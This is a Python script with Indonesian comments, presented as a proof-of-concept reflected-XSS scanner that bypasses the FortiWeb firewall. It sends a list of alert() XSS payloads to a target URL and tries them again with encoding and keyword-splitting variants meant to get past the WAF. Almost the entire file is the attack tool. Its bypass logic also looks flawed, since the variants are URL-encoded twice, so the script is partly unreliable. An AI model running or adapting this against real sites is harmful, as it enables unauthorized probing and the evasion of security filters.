import requests
import argparse
import logging
from urllib.parse import quote
from termcolor import colored
import sys

# Konfigurasi logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def test_xss(url, payload):
    """Menguji kerentanan XSS dengan payload tertentu."""
    try:
        encoded_payload = quote(payload)
        response = requests.get(f"{url}?key={encoded_payload}")
        if payload in response.text:
            logging.warning(colored(f"Potensi XSS terdeteksi dengan payload: {payload}", "red"))
            return True
        else:
            logging.info(colored(f"Payload {payload} tidak berhasil.", "yellow"))
            return False
    except requests.exceptions.RequestException as e:
        logging.error(colored(f"Error saat mengirim permintaan: {e}", "red"))
        return False

def main():
    parser = argparse.ArgumentParser(description="PoC XSS Reflecteddengan Bypass FortiWeb")
    parser.add_argument("url", help="URL target")
    parser.add_argument("-f", "--file", help="File berisi daftar payload XSS (opsional)")
    args = parser.parse_args()

    # Payload XSS default
    default_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>"
    ]

    # Membaca payload dari file jika diberikan
    if args.file:
        with open(args.file, "r") as f:
            payloads = [line.strip() for line in f]
    else:
        payloads = default_payloads

    logging.info(colored(f"Mulai pengujian XSS pada {args.url}", "green"))

    for payload in payloads:
        logging.info(colored(f"Menguji payload: {payload}", "cyan"))

        # Teknik Bypass FortiWeb:
        bypass_techniques = [
            lambda p: p,  # Payload asli
            lambda p: p.replace("<", "%3C"),  # Encoding HTML
            lambda p: p.replace(" ", "%20"),  # Encoding URL
            lambda p: p.replace("script", "scri%20pt"),  # Memisahkan kata kunci
            lambda p: p.replace("alert", "ale%20rt"),  # Memisahkan kata kunci
            lambda p: p.replace("(", "%28").replace(")", "%29"),  # Encoding karakter khusus
        ]

        for technique in bypass_techniques:
            modified_payload = technique(payload)
            if test_xss(args.url, modified_payload):
                break  # Jika berhasil, tidak perlu mencoba teknik lain

if __name__ == "__main__":
    main()
